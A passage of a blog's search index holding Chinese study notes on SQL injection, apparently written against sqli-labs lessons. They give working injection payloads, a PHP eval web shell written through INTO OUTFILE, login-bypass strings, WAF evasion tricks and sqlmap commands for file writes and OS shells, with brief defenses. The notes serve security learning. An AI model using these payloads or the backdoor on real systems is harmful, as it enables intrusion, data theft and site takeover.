    <content type="html"><![CDATA[<p>本文介绍了利用SQL注入读写文件，写入后门的方法</p><a id="more"></a><h1 id="SQL注入读写文件"><a href="#SQL注入读写文件" class="headerlink" title="SQL注入读写文件"></a>SQL注入读写文件</h1><h2 id="01-读写文件的前提"><a href="#01-读写文件的前提" class="headerlink" title="01 读写文件的前提"></a>01 读写文件的前提</h2><ol><li><p>知道读写文件的绝对路径</p></li><li><p>当前用户权限足够</p></li><li><p>secure_file_priv参数配置正确：</p><p>该参数限制了文件读写的路径，在mysql配置文件中修改</p><ol><li>secure_file_priv=               不对读写作出限制</li><li>secure_file_priv=null        禁止读写</li><li>secure_file_priv=’path’     只允许在path路径下操作，包括子目录</li></ol></li></ol><h2 id="02-读取文件"><a href="#02-读取文件" class="headerlink" title="02 读取文件"></a>02 读取文件</h2><p>以Lesson1为例，首先创建一个flag.txt</p><ol><li>?id=1’ order by 3–+ 得到有三个字段</li><li>?id=-1’ union select 1,load_file(“绝对路径\flag.txt”),3 –+<br>在字段2处读取出文件<br><strong>联合查询要使前边报错</strong></li></ol><h2 id="03-写入文件"><a href="#03-写入文件" class="headerlink" title="03 写入文件"></a>03 写入文件</h2><p>以Lesson1为例</p><ol><li><p>?id=1’)) order by 3–+ 得到有三个字段</p></li><li><p>?id=1’)) union select 1,’&lt;?php phpinfo(); ?&gt;‘,3 into outfile ‘绝对路径’–+</p></li></ol><p>也可以写入一句话木马&lt;?php @eval($_POST[‘x’]; ?&gt;,然后使用菜刀链接</p><p>除了一句话木马，还可以使用weevely、webacco等生成后门</p><h2 id="03-sqlmap读写文件"><a href="#03-sqlmap读写文件" class="headerlink" title="03 sqlmap读写文件"></a>03 sqlmap读写文件</h2><p>读文件 sqlmap -u “url” –file-read “绝对路径flag.txt”</p><p>写文件 sqlmap -u “url” –file-write “本地绝对路径flag.txt” –file-dest “目标绝对路径”</p><p>检测权限 sqlmap -u “url” –is-dba</p><p>获取SQLshell ：sqlmap -u “url” –sql-shell</p><p>获取系统shell ：sqlmap -u “url” –os-shell</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 几种特殊的注入</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了二次注入、宽字节注入</p><a id="more"></a><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="01-二次注入介绍"><a href="#01-二次注入介绍" class="headerlink" title="01 二次注入介绍"></a>01 二次注入介绍</h2><ol><li>先构造语句（此语句含有被转义字符的语句）</li><li>将我们构造的恶意语句存入数据库；</li><li>第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有已存入的数据做检查，成功注入）</li></ol><h2 id="02-二次注入利用"><a href="#02-二次注入利用" class="headerlink" title="02 二次注入利用"></a>02 二次注入利用</h2><p><strong>Lesson 24</strong></p><ol><li>注册用户名 admin’ – -<br>密码123456</li><li>进行登录</li><li>修改密码为112233</li><li>成功将admin的密码修改为112233<br>而admin’ – -的密码没有改变</li></ol><h2 id="03-二次注入危害"><a href="#03-二次注入危害" class="headerlink" title="03 二次注入危害"></a>03 二次注入危害</h2><ol><li>注入payload触发二次sql注入</li><li>注入payload触发xss攻击</li></ol><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入适用于单引号被转义为\‘的场景，原理是将反斜杠拼接成一个宽字符，从而避免单引号被转义</p><h2 id="01-宽字节注入基础"><a href="#01-宽字节注入基础" class="headerlink" title="01 宽字节注入基础"></a>01 宽字节注入基础</h2><p>GBK编码 占用两字节，ASCII编码占用一个字节</p><p>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集</p><p>如果PHP中有addslashes函数，单引号就会被转义为\‘，通常使用%DF进行宽字符注入绕过，’URL编码是%27，\URL编码是%5C，即%DF\‘会被转为%DF%5C%27</p><p>若网站的字符集是GBK，MYSQL使用的编码也是GBK，就会认为%DF%5C是一个宽字符,从而解析为 <strong>宽字符’</strong></p><p>最常使用的宽字节注入是%DF，其实只要用ascii码大于128的即可</p><p>%81-%FE均可注入<strong>（%7F除外）</strong></p><p><strong>ascii码转码方法</strong></p><p>如ascii码为129，先将129转为十六进制，即为0x81，然后加%即可，%81</p><h2 id="02-绕过演示"><a href="#02-绕过演示" class="headerlink" title="02 绕过演示"></a>02 绕过演示</h2><p><strong>Lesson 32</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><p><strong>Lesson 33</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><h2 id="03-sqlmap安全测试"><a href="#03-sqlmap安全测试" class="headerlink" title="03 sqlmap安全测试"></a>03 sqlmap安全测试</h2><p>sqlmap -u “URL?id=%df%27”</p><p><strong>用于宽字节注入的脚本 unmagicquotes.py</strong></p><p>sqlmap -u “URL?id=1” –tamper=unmagicquotes.py</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 SQLmap的使用方法</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了自动化注入工具SQLmap常用的命令和脚本</p><a id="more"></a><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>半自动化注入：burpsuite</p><p>自动化注入：sqlmap</p><p><strong>sqlmap需要使用python2环境</strong></p><h2 id="01-基本探测参数"><a href="#01-基本探测参数" class="headerlink" title="01 基本探测参数"></a>01 基本探测参数</h2><ol><li><p>-u “url” 设定注入点</p></li><li><p>–dbs 列出所有数据库名</p><p>–current-db 列出当前数据库</p><p>-D 指定一个数据库</p></li><li><p>–tables 列出所有表名</p><p>–T 指定一个表</p></li><li><p>–columns 列出所有字段名</p><p>-C 指定字段</p></li><li><p>–dump 列出字段内容</p></li></ol><p>示例：</p><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol><p>-v 输出级别分为0-6，默认为1 ：<br>0：只显示Python的tracebacks信息、错误信息和关键信息<br>1：同时显示普通信息[INFO]和警告信息[WARNING]；<br>2：同时显示调试信息[DEBUG]；<br>3：同时显示注入使用的攻击荷载；<br>4：同时显示HTTP请求；<br>5：同时显示HTTP响应头；<br>6：同时显示HTTP响应体。</p><p>-d 直接连接数据库</p><h2 id="02-获取目标参数"><a href="#02-获取目标参数" class="headerlink" title="02 获取目标参数"></a>02 获取目标参数</h2><ol><li><p>–batch 所有交互选项使用默认选项</p></li><li><p>–banner 返回banner信息</p></li><li><p>对单一url探测 sqlmap -u url </p></li><li><p>从文件中读取目标：</p><ul><li>-l 从burpsuite proxy 或者webscarab proxy中读取http请求日志文件<br>burpsuite==&gt;Project options==&gt;Logging==&gt;Proxy==&gt;Requests</li></ul><ul><li><p>-x 从sitemap.xml站点地图文件中读取目标探测</p></li><li><p>-m 从多行文本格式文件中读取多个目标，对多个目标进行探测</p></li><li><p>-r 从文本文件中读取http请求作为sql注入的探测目标</p></li><li><p>-c 从配置文件 sqlmap.conf中读取目标探测</p></li></ul></li><li><p>-g 自动利用google获取指定的googlehack等目标，然后利用交互向导模式进行探测</p></li><li><p>-f fingerprint</p></li></ol><h2 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h2><ol><li><p>设置http方法<br>一般情况下会自动使用合适的方法，但是PUT方法不会自动使用 –method=PUT</p></li><li><p>设置post提交参数</p><p>默认方法是GET，可以提供POST请求中的数据将其隐性改变成POST<br>Sqlmap -u url –data=”data” </p><p>使用burpsuite抓包，保存为1.txt<br>sqlmap -r 1.txt</p></li><li><p>设置参数分隔符<br>默认分隔符为&amp;，也可以指定 –param-del=”分隔符”</p></li><li><p>设置cookie –cookie</p><p>使用场景：web应用有基于cookie验证的过程 想用cookie的值进行注入</p><p>web应用程序使用set-cookie进行响应，sqlmap将在所有进一步http请求中自动使用其值作为cookie标头。可以使用–drop-set-cookie将忽略任何即将到来的set-cookie头</p><p>load-cookie 可以用来提供包含Netscape/wget格式的cookie的特殊文件</p><p><strong>注意：如果对http cookie值进行探测，需要设置–level 2及以上</strong></p></li><li><p>设置user-agent<br>设置为指定值 –user-agent=””<br>设置为随机值 –random-agent<br>target.txt中在user-agent后边加一个*，表示对user-agent进行探测</p><p><strong>注意：如果对user-agent值进行探测，需要设置–level 3及以上</strong></p></li><li><p>设置host</p><p><strong>注意：如果对host值进行探测，需要设置–level 5</strong></p></li><li><p>设置referer<br><strong>注意：如果对referer值进行探测，需要设置–level 3及以上</strong></p></li><li><p>额外的http头<br>一个头 -H或–header<br>多个头 –headers=”Host:www,target.com\nUser-agent:Firefox” -v 5<br>多个标头用换行分隔<br>也可以在配置文件中进行设置<br>-v 5 是为了现实输出结果</p></li><li><p>读文件<br>–file-read ‘文件绝对路径’</p></li><li><p>写入文件<br>  –file-write ‘本地绝对路径’ –file-dest ‘目标绝对路径’</p></li><li><p>设定探测类型<br>–technique BEUSTQ </p><ul><li>B 布尔类型 </li><li>E 基于错误</li><li>U union查询</li><li>S 堆叠查询</li><li>T 基于时间的查询</li><li>Q 查询</li></ul><p>若不指定则使用全部技术</p></li></ol><h2 id="使用tamper脚本"><a href="#使用tamper脚本" class="headerlink" title="使用tamper脚本"></a>使用tamper脚本</h2><p>sqlmap … –tamper ‘脚本名’</p><p>常见的tamper有：</p><ol><li><p>apostrophemask.py<br>将单引号URL编码，避免被过滤</p></li><li><p>apostrophenullencode.py</p><p>将单引号替换为宽字节编码，避免被过滤</p></li><li><p>base64encode.py<br>进行base64编码</p></li><li><p>between.py<br>将大于号和等号替换为between</p></li><li><p>equaltolike.py<br>将=替换为like</p></li><li><p>space2comment.py<br>将空格替换为/**/</p></li><li><p>space2randomblank.py<br>将空格替换为随机的空白字符</p></li><li><p>space2plus.py<br>将空格替换为+</p></li><li><p>space2mysqldash.py<br>将空格替换为–\n</p></li><li><p>bluecoat.py<br>替换sql关键字后边的空格，并且将=替换为like</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>工具使用</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 盲注</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<p>本文简单介绍了一种特殊的SQL注入，盲注</p><a id="more"></a><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注的原理是向数据库发送判断真假的语句，根据页面状态判断真假</p><p>盲注可以分为基于布尔的盲注和基于时间的盲注，后者耗时较长</p><h2 id="01-基于布尔的盲注"><a href="#01-基于布尔的盲注" class="headerlink" title="01 基于布尔的盲注"></a>01 基于布尔的盲注</h2><p>原理：根据页面显示的状态判断查询语句真假</p><p>适用场景：网页会因为查询语句的真假而显示不同的状态</p><p>例如一个网页在查询为真时，页面无显示，而查询为假时页面会有警告，这时就可以使用盲注进行注入，通常使用枚举的方法。</p><p>常用的函数如substr(str,m,n)即从字符串str的第m个字符（从1开始计数，包括自身）向后取n个字符，substr(str,1,1)即取第一个字符。</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and length(database())=1 –+ 页面显示为假</li><li>?id=1 and length(database())=2 –+ 页面显示为假</li><li>?id=1 and length(database())=3 –+ 页面显示为真，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and ascii(substr(databse(),1,1))=97 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=98 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=99 –+ 页面显示为真，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>同理可以继续进行探测</p><p><strong>为了避免次数过多，可以转换成ASCII码，然后使用位运算比较</strong></p><h2 id="02-基于时间的盲注"><a href="#02-基于时间的盲注" class="headerlink" title="02 基于时间的盲注"></a>02 基于时间的盲注</h2><p>原理：根据页面延时判断查询语句真假</p><p>适用场景：无论查询语句真假，网页显示的状态相同，此时我们可以使用sleep()函数构造查询语句，人为创造出页面显示的真假状态，即加载时长。</p><p>常用语句if(exp,t,f)即当表达式exp为真时返回t，为假时返回f<br>if(ascII(substr(database(),1,1)=115,sleep(3),1))表示当数据库名第一个字符的ASCII码是115时就延时3s，否则返回1（正常显示无延时）</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and if(length(database())=1,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=2,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=3,sleep(5),1) –+ 页面加载延时5s，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and if(ascii(substr(databse(),1,1))=97,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=98,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=99,sleep(5),1) –+ 页面加载延时5s，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>除sleep外还可以使用benchmark函数<br>benchmark(n,exp)表示执行表达式exp n次，当n很大时就可以起到延时效果<br>如if(ascii(substr(databse(),1,1))=97,benchmark(md5(‘a’),1000000),1)</p><h2 id="03-SQLmap盲注"><a href="#03-SQLmap盲注" class="headerlink" title="03 SQLmap盲注"></a>03 SQLmap盲注</h2><p>sqlmap -u url –technique T –dbs 指定-T为基于时间的盲注<br><strong>BEUSTQ B布尔 E错误 Uunion注入 S堆叠 T时间 Q查询</strong><br><strong>若不指定则使用全部技术，时间较长</strong></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入整理</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>本文整理了SQL注入的原理、分类等基础知识</p><a id="more"></a><h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><h2 id="01-SQL注入的原因"><a href="#01-SQL注入的原因" class="headerlink" title="01 SQL注入的原因"></a>01 SQL注入的原因</h2><ol><li>程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li><li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li></ol><h2 id="02-可能存在SQL注入的位置"><a href="#02-可能存在SQL注入的位置" class="headerlink" title="02 可能存在SQL注入的位置"></a>02 可能存在SQL注入的位置</h2><p>web应用在获取用户数据的地方，只要带入数据库查询，就可能存在注入</p><p>常见的地方包括：</p><ol><li>GET数据</li><li>POST数据</li><li>HTTP头部</li><li>COOKIE数据</li></ol><p>…</p><h2 id="03-SQL注入的危害"><a href="#03-SQL注入的危害" class="headerlink" title="03 SQL注入的危害"></a>03 SQL注入的危害</h2><ol><li>获取管理员的账号密码</li><li>获取数据库中内容</li><li>修改或插入数据到数据库内</li><li>利用注入漏洞获得webshell</li><li>mof提权、udf提权</li></ol><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="01-简单案例讲解"><a href="#01-简单案例讲解" class="headerlink" title="01 简单案例讲解"></a>01 简单案例讲解</h2><ol><li><p>在常见的登录页面，通常使用如下SQL语句：<br>select * from admin where username=’输入的用户名’ and password=’输入的密码’</p><p>如果用户输入的用户名为’ or 1=1 –  <strong>注意最后需要有一个空格</strong><br>拼接起来的SQL语句为<br>select * from admin where username=’ <strong>‘ or 1=1 –</strong> <del>‘ and password=’输入的密码’</del></p><p>使用单引号提前闭合，or 1=1永远为真，–将后边的内容注释掉，即完成查询，实现了登录，我们输入的’ or 1=1 –  就可以看作为一个万能密码</p></li><li><p>SQL语句中的注释</p></li></ol><ul><li><p>#（可以用%23代替)</p></li><li><p>–+ 或者–空格 (空格可以用%20代替)</p></li><li><p>/<em>….\</em>/</p></li><li><p>/<em>!…\</em>/ 此为内联注释，在mysql中可以执行注释中的语句，其他系统无法执行<br>如：select * from articles where id=id</p><p>使用内联注释注入 select *from articles where id=</p><p>-1 /*!union*//*!select*/ 1,2,3,4</p><p>在mysql中可以执行 union select 1,2,3,4</p></li></ul><p>以下列出了一些常见的万能密码</p><pre><code class="hljs ada"><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-string">"or "</span>a<span class="hljs-string">"="</span>a<span class="hljs-string">"or 1=1--</span><span class="hljs-string">"</span><span class="hljs-keyword">or</span><span class="hljs-string">"="</span><span class="hljs-string">"or"</span>=<span class="hljs-string">"a'='a</span><span class="hljs-string">"</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-string">"or=or"</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'') <span class="hljs-keyword">or</span> (<span class="hljs-string">'a'</span>=<span class="hljs-symbol">'a</span>'.).<span class="hljs-keyword">or</span>.('.a.<span class="hljs-string">'='</span>.a<span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-symbol">'or</span><span class="hljs-string">"="</span>a<span class="hljs-string">'='</span>a<span class="hljs-symbol">'or</span><span class="hljs-string">' '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'<span class="hljs-symbol">'or.</span><span class="hljs-symbol">'a.</span><span class="hljs-string">'='</span>a<span class="hljs-symbol">'or1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-number">1</span><span class="hljs-symbol">'or</span><span class="hljs-string">'1'</span>='<span class="hljs-number">1</span>a<span class="hljs-symbol">'or</span>' <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>a<span class="hljs-symbol">'or</span>'<span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-keyword">or</span> <span class="hljs-string">'a'</span>=<span class="hljs-string">'a'</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span></code></pre><p>可以将以上密码作为字典，使用burpsuite用枚举的方法进行测试</p><h2 id="02-简单注入漏洞探测"><a href="#02-简单注入漏洞探测" class="headerlink" title="02 简单注入漏洞探测"></a>02 简单注入漏洞探测</h2><p>一般网页的CMS逻辑为：CMS逻辑：index.php首页展示内容，具有文章列表（链接具有文章id）、articles.php文章详细页，URL中article.php?id=文章id读取id对应文章<br>可以利用Google Hacking寻找可能存在漏洞的URL</p><p>简单验证方法，如在URL中?id=1 后边添加内容：</p><ol><li>单引号 ‘</li><li>and 1=1</li><li>and 1=2</li></ol><p>*<em>逻辑运算<br>在SQL语句中，and比or的优先级高<br>select 1=2 and 1=2 or 1=1<br>返回的结果为1 *</em></p><p>如果页面中mysql报错，证明存在sql注入漏洞<br>如果报错信息中存在自己输入的值，就是字符型注入，否则是数字型注入    </p><p>根据页面显示的内容，可以分为报错注入、盲注等</p><h2 id="03-SQL注入的分类"><a href="#03-SQL注入的分类" class="headerlink" title="03 SQL注入的分类"></a>03 SQL注入的分类</h2><ol><li>根据输入数据的分类：<ul><li>数字型 select * from table where id=@id</li><li>字符型 select * from table where id=’@id’</li></ul></li><li>根据注入手法的分类：<ul><li>联合查询 页面有回显<br>使用order by判断出表的列数<br>使用select 1，2，3 观察各列的输出情况，替换成想要查询的内容</li><li>报错注入 页面有报错信息<br>报错信息会显示在页面中，可以执行报错注入<br>可以使用group by语句报错，如：<br>?id=1 union select 1,concat(left(rand(),3),’^’,(select version()),’^’)a,count(*),3 from information_schema.tables group by a –+</li><li>布尔盲注 页面有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>根据页面的真假状态进行判断表达式是否正确</li><li>延时盲注 页面没有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>使用if(exp,sleep(),1)根据时间判断表达式是否正确</li></ul></li><li>根据提交方式的分类：<ul><li>GET型 可以直接在URL中修改参数进行测试</li><li>POST型 需要抓包进行参数修改</li></ul></li><li>一些特殊的注入：宽字节注入、二次注入<h2 id="04-sql注入常用的函数"><a href="#04-sql注入常用的函数" class="headerlink" title="04 sql注入常用的函数"></a>04 sql注入常用的函数</h2><ul><li>select user()查看当前用户名</li><li>select database()查看当前数据库</li><li>select version()查看当前版本</li><li>Limit m,n 从第m行开始到第m+n行（从0开始索引）</li><li>order by 获取字段数</li><li>length() 获取长度</li><li>ascii() 获取ascii码</li><li>substring(s,m,n),substr(),mid() 截取字符串<br>三个参数分别是截取的字符串，截取的起始位置(从1开始计数)，截取长度</li><li>floor(x) 返回不大于x的最大整数</li><li>round() 返回参数x最接近的整数</li><li>rand() 返回0-1之间的随机浮点数</li><li>load_file() 读取文件，并返回文件内容作为一个字符串</li><li>select … into outfile ‘绝对路径’ 写入文件</li><li>sleep(n) 延时n秒</li><li>benchmark(n,e) 执行e表达式n次，通过指定较大的n，实现延时</li><li>if(exp,t,f) 如果exp表达式为真就返回t，为假就返回f </li></ul></li></ol><h2 id="05-SQL注入绕过方式"><a href="#05-SQL注入绕过方式" class="headerlink" title="05 SQL注入绕过方式"></a>05 SQL注入绕过方式</h2><ol><li><p>大小写绕过，sql语句对大小写不敏感</p><p>如：AnD、ORdeR</p></li><li><p>使用&amp;&amp;、||替换and和or</p></li><li><p>双写绕过<br>如：un<del><strong>union</strong></del>ion</p></li><li><p>编码绕过</p><p>利用URL编码 或 十六进制编码</p></li><li><p>内联注释绕过<br>mysql中内联注释中的内容会被执行<br>如：/*!select*/ * from admin 可以正常执行</p></li><li><p>注释被过滤时，要闭合后边 </p></li></ol><h2 id="06-SQL注入的防御"><a href="#06-SQL注入的防御" class="headerlink" title="06 SQL注入的防御"></a>06 SQL注入的防御</h2><ol><li>对用户输入的值进行过滤</li><li>规范页面输出的错误提示</li><li>使用预编译</li><li>管理好数据库账号的权限</li><li>对数据库内敏感信息进行加密</li></ol><h2 id="07-利用sqlmap进行探测"><a href="#07-利用sqlmap进行探测" class="headerlink" title="07 利用sqlmap进行探测"></a>07 利用sqlmap进行探测</h2><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol><h1 id="Mysql注入有关知识点"><a href="#Mysql注入有关知识点" class="headerlink" title="Mysql注入有关知识点"></a>Mysql注入有关知识点</h1><h2 id="01-Mysql-5-x数据结构"><a href="#01-Mysql-5-x数据结构" class="headerlink" title="01 Mysql 5.x数据结构"></a>01 Mysql 5.x数据结构</h2><p>在5.0以上版本中，默认定义了infomation数据库，用来存储数据库元信息。其中有表schemata（数据库名）、tables（表名）、columns（列名）</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名和表名</p><p>在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><h2 id="02-SQL增删改查"><a href="#02-SQL增删改查" class="headerlink" title="02 SQL增删改查"></a>02 SQL增删改查</h2><p>Insert into values</p><p>delete from</p><p>Update set where</p><p>Select from where</p><h2 id="03-Mysql常用聚合函数"><a href="#03-Mysql常用聚合函数" class="headerlink" title="03 Mysql常用聚合函数"></a>03 Mysql常用聚合函数</h2><p>select user()查看当前用户名</p><p>select database()查看当前数据库</p><p>select version()查看当前版本</p><p>Limit m,n 从第m行开始到第m+n行（从0开始索引）</p><h2 id="04-注释"><a href="#04-注释" class="headerlink" title="04 注释"></a>04 注释</h2><p># </p><p>–➕空格       <strong>空格可能被过滤，可以用%20代替</strong></p><p>/**/</p><p>内联注释 ： /<em>!SQL语句\</em>/   只有Mysql可以识别，常用来绕过waf</p><p>如：select * from articles where id=id</p><p>使用内联注释注入 select *from articles where id=</p><p>-1 /*!union*//*!select*/ 1,2,3,4</p><p>在mysql中可以执行 union select 1,2,3,4</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
